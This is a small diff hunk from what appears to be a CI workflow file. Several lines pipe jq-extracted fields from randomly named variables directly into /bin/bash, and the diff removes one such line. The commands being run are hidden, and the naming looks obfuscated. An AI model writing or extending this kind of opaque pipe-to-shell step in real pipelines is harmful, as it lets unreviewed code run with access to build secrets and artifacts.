@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ii32178" | jq -r .nun9742 | /bin/bash
           echo $ih711 | jq -r .oq69 | /bin/bash
           echo $b8416 | jq -r .q0483 | /bin/bash
-          printf '%s' "$zov10" | jq -r .tu52873 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
